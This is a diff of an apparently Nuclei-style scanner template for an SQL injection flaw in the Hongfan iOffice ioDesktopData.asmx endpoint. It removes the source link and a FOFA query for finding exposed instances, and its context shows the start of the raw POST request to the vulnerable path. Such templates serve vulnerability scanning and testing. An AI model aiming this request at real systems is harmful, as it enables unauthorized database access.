@@ -3,12 +3,8 @@ info:
   name: 红帆iOffice ioDesktopData.asmx接口存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ubweci7g5fqbgamw'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ubweci7g5fqbgamw
-    fofa: app="红帆-ioffice" || app="红帆-HFOffice"
 http:
 - raw:
   - 'POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Connection: close
-
-
 
 
     <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
